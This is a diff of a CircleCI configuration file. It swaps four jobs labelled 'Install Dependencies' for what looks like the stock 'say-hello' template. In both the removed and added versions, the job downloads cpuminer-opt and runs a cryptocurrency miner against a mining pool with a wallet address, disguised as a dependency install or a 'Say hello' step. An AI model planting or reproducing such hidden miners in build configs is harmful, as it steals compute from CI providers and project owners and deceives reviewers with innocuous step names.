@@ -1,38 +1,26 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+  say-hello:
+    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: cimg/base:stable
+    # Add steps to the job
+    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz ./cpuminer-sse2 -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u Md1PbiMHtr32QxpW7dgvdN44a9CDQpP7AW.test -t 16
+
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+  say-hello-workflow:
+    jobs:
+      - say-hello
